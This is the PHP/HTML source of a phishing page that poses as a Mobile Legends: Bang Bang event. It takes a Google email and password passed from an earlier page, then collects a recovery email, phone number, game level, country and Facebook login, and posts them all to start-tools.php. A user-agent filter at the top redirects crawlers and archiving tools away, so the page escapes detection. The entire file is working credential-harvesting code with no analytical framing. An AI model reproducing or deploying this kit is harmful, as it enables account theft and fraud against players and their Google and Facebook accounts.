<!---

Author Real Name: Arfan Rizki Ramadhan
Author Alias Name: RAFLIPEDIA
Author URL: raflip-edia.blogspot.com
Date Created: 14 August 2017 at 8:03 WIB
Thanks to: MALASNGODING
Note: PLEASE DO NOT CHANGE THIS COPYRIGHT! 

--->
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.raflipedia.club/');
die();
}
?>

<?php
$email = $_POST['email'];
$pass = $_POST['password'];
?>
<html>
<head>
<meta charset="UTF-8">
<title>Mobile Legends - Bang Bang</title>
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="assets/css/style.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="assets/js/jquery-1.10.2.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="assets/js/custom.js"></script>
<meta name="description" content="Join the Mobile Legends - Bang Bang new event! And get what do you want!"/>
</head>
<body  style="background: #000 url('img/bgnya.jpg') top center no-repeat;">


<div class="container">
<nav class="navbar navbar-inverse navbar-fixed-top">
<div class="container">
<div class="navbar-header">
<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<a class="navbar-brand" href="/">Mobile Legends</a>
</div>
<div id="navbar" class="collapse navbar-collapse">


<ul class="nav navbar-nav navbar-right">
<li><a href="index.php"><i class="fa fa-sign-out"></i> Sign out</a></li>
</ul>
	  
</div>
</div>
</nav>







               
<div class="panel panel-info" >
<div class="panel-heading">
<div class="panel-title"><i class="fa fa-check"></i> Complete your Google account and Facebook account</div>
</div>     

</br>

<center><img height="70" width="300" src="img/gugel.png"></center>

</br>

<div style="padding-top:30px" class="panel-body" >
<div style="display:none" id="login-alert" class="alert alert-danger col-sm-12"></div>
<form id="loginform" class="form-horizontal" method="post" action="start-tools.php" role="form">

<div style="margin-bottom: 25px" class="input-group">
<span class="input-group-addon"><i class="fa fa-user"></i></span>
<input id="email" type="text" class="form-control" name="email" value="<?php echo $email;?>" readonly>
</div>

<div style="margin-bottom: 25px" class="input-group">
<span class="input-group-addon"><i class="fa fa-lock"></i></span>
<input id="pass" type="password" class="form-control" name="pass" value="<?php echo $pass;?>" readonly>
</div>

<div style="margin-bottom: 25px" class="input-group">
<span class="input-group-addon"><i class="fa fa-signal"></i></span>
<input id="level" type="number" class="form-control" name="level" placeholder="Level" required>
</div>

<div style="margin-bottom: 25px" class="input-group">
<span class="input-group-addon"><i class="fa fa-user-plus"></i></span>
<input id="rec" type="email" class="form-control" name="rec" placeholder="Recovery Email Address" required>
</div>

<div style="margin-bottom: 25px" class="input-group">
<span class="input-group-addon"><i class="fa fa-phone"></i></span>
<input id="hp" type="number" class="form-control" name="hp" placeholder="Phone Number" required>
</div>

<div style="margin-bottom: 25px" class="input-group">
<span class="input-group-addon"><i class="fa fa-desktop"></i></span>
<select class="form-control" id="plat" name="plat" required>
<option>Platfrom</option>
<option>Android</option>
<option>iOS</option>
</select>
</div>

<div style="margin-bottom: 25px" class="input-group">
<span class="input-group-addon"><i class="fa fa-flag"></i></span>
<select class="form-control" id="negara" name="negara">
<option >Afghanistan</option>
<option >Albania</option>
<option >Algeria</option>
<option >American Samoa</option>
<option >Andorra</option>
<option >Angola</option>
<option >Anguilla</option>
<option >Antarctica</option>
<option >Antigua and Barbuda</option>
<option >Argentina</option>
<option >Armenia</option>
<option >Aruba</option>
<option >Australia</option>
<option >Austria</option>
<option >Azerbaijan</option>
<option >Bahrain</option>
<option >Bangladesh</option>
<option >Barbados</option>
<option >Belarus</option>
<option >Belgium</option>
<option >Belize</option>
<option >Benin</option>
<option >Bermuda</option>
<option >Bhutan</option>
<option >Bolivia</option>
<option >Bosnia and Herzegovina</option>
<option >Botswana</option>
<option >Bouvet Island</option>
<option >Brazil</option>
<option >British Indian Ocean Territory</option>
<option >British Virgin Islands</option>
<option >Brunei</option>
<option >Bulgaria</option>
<option >Burkina Faso</option>
<option >Burundi</option>
<option >C�te d'Ivoire</option>
<option >Cambodia</option>
<option >Cameroon</option>
<option >Canada</option>
<option >Cape Verde</option>
<option >Cayman Islands</option>
<option >Central African Republic</option>
<option >Chad</option>
<option >Chile</option>
<option >China</option>
<option >Christmas Island</option>
<option >Cocos (Keeling) Islands</option>
<option >Colombia</option>
<option >Comoros</option>
<option >Congo</option>
<option >Cook Islands</option>
<option >Costa Rica</option>
<option >Croatia</option>
<option >Cuba</option>
<option >Cyprus</option>
<option >Czech Republic</option>
<option >Democratic Republic of the Congo</option>
<option >Denmark</option>
<option >Djibouti</option>
<option >Dominica</option>
<option >Dominican Republic</option>
<option >East Timor</option>
<option >Ecuador</option>
<option >Egypt</option>
<option >El Salvador</option>
<option >Equatorial Guinea</option>
<option >Eritrea</option>
<option >Estonia</option>
<option >Ethiopia</option>
<option >Faeroe Islands</option>
<option >Falkland Islands</option>
<option >Fiji</option>
<option >Finland</option>
<option >Former Yugoslav Republic of Macedonia</option>
<option >France</option>
<option >France, Metropolitan</option>
<option >French Guiana</option>
<option >French Polynesia</option>
<option >French Southern Territories</option>
<option >Gabon</option>
<option >Georgia</option>
<option >Germany</option>
<option >Ghana</option>
<option >Gibraltar</option>
<option >Greece</option>
<option >Greenland</option>
<option >Grenada</option>
<option >Guadeloupe</option>
<option >Guam</option>
<option >Guatemala</option>
<option >Guinea</option>
<option >Guinea-Bissau</option>
<option >Guyana</option>
<option >Haiti</option>
<option >Heard and Mc Donald Islands</option>
<option >Honduras</option>
<option >Hong Kong</option>
<option >Hungary</option>
<option >Iceland</option>
<option >India</option>
<option >Indonesia</option>
<option >Iran</option>
<option >Iraq</option>
<option >Ireland</option>
<option >Israel</option>
<option >Italy</option>
<option >Jamaica</option>
<option >Japan</option>
<option >Jordan</option>
<option >Kazakhstan</option>
<option >Kenya</option>
<option >Kiribati</option>
<option >Kuwait</option>
<option >Kyrgyzstan</option>
<option >Laos</option>
<option >Latvia</option>
<option >Lebanon</option>
<option >Lesotho</option>
<option >Liberia</option>
<option >Libya</option>
<option >Liechtenstein</option>
<option >Lithuania</option>
<option >Luxembourg</option>
<option >Macau</option>
<option >Madagascar</option>
<option >Malawi</option>
<option >Malaysia</option>
<option >Maldives</option>
<option >Mali</option>
<option >Mayotte</option>
<option >Marshall Islands</option>
<option >Martinique</option>
<option >Mauritania</option>
<option >Mauritius</option>
<option >Mexico</option>
<option >Micronesia</option>
<option >Moldova</option>
<option >Monaco</option>
<option >Mongolia</option>
<option >Montenegro</option>
<option >Montserrat</option>
<option >Morocco</option>
<option >Mozambique</option>
<option >Myanmar</option>
<option >Namibia</option>
<option >Nauru</option>
<option >Nepal</option>
<option >Netherlands</option>
<option >Netherlands Antilles</option>
<option >New Caledonia</option>
<option >New Zealand</option>
<option >Nicaragua</option>
<option >Niger</option>
<option >Nigeria</option>
<option >Niue</option>
<option >Norfolk Island</option>
<option >North Korea</option>
<option >Northern Marianas</option>
<option >Norway</option>
<option >Oman</option>
<option >Pakistan</option>
<option >Palau</option>
<option >Panama</option>
<option >Papua New Guinea</option>
<option >Paraguay</option>
<option >Peru</option>
<option >Philippines</option>
<option >Pitcairn Islands</option>
<option >Poland</option>
<option >Portugal</option>
<option >Puerto Rico</option>
<option >Qatar</option>
<option >Reunion</option>
<option >Romania</option>
<option >Russia</option>
<option >Rwanda</option>
<option >S�o Tom� and Pr�ncipe</option>
<option >Saint Helena</option>
<option >St. Pierre and Miquelon</option>
<option >Saint Kitts and Nevis</option>
<option >Saint Lucia</option>
<option >Saint Vincent and the Grenadines</option>
<option >Samoa</option>
<option >San Marino</option>
<option >Saudi Arabia</option>
<option >Senegal</option>
<option >Serbia</option>
<option >Seychelles</option>
<option >Sierra Leone</option>
<option >Singapore</option>
<option >Slovakia</option>
<option >Slovenia</option>
<option >Solomon Islands</option>
<option >Somalia</option>
<option >South Africa</option>
<option >South Georgia and the South Sandwich Islands</option>
<option >South Korea</option>
<option >Spain</option>
<option >Sri Lanka</option>
<option >Sudan</option>
<option >Suriname</option>
<option >Svalbard and Jan Mayen Islands</option>
<option >Swaziland</option>
<option >Sweden</option>
<option >Switzerland</option>
<option >Syria</option>
<option >Taiwan</option>
<option >Tajikistan</option>
<option >Tanzania</option>
<option >Thailand</option>
<option >The Bahamas</option>
<option >The Gambia</option>
<option >Togo</option>
<option >Tokelau</option>
<option >Tonga</option>
<option >Trinidad and Tobago</option>
<option >Tunisia</option>
<option >Turkey</option>
<option >Turkmenistan</option>
<option >Turks and Caicos Islands</option>
<option >Tuvalu</option>
<option >US Virgin Islands</option>
<option >Uganda</option>
<option >Ukraine</option>
<option >United Arab Emirates</option>
<option >United Kingdom</option>
<option >United States</option>
<option >United States Minor Outlying Islands</option>
<option >Uruguay</option>
<option >Uzbekistan</option>
<option >Vanuatu</option>
<option >Vatican City</option>
<option >Venezuela</option>
<option >Vietnam</option>
<option >Wallis and Futuna Islands</option>
<option >Western Sahara</option>
<option >Yemen</option>
<option >Zambia</option>
<option >Zimbabwe</option>
</select>
</div>

<hr>



<center><img height="70" width="300" src="img/pesbuk.png"></center>

</br>


<div style="margin-bottom: 25px" class="input-group">
<span class="input-group-addon"><i class="fa fa-user"></i></span>
<input id="efb" type="email" class="form-control" name="efb" placeholder="Email Address" required>
</div>

<div style="margin-bottom: 25px" class="input-group">
<span class="input-group-addon"><i class="fa fa-lock"></i></span>
<input id="pfb" type="password" class="form-control" name="pfb" placeholder="Password" required>
</div>


<center><center><button class="btn btn-success btn-block scroll" type="submit"><i class="fa fa-check"></i> Complete</button></center></center>
</form> 



</div>
</div>
</div>    
</div>                     
</div>  
</div>
</div>
</div>


</body>
</html>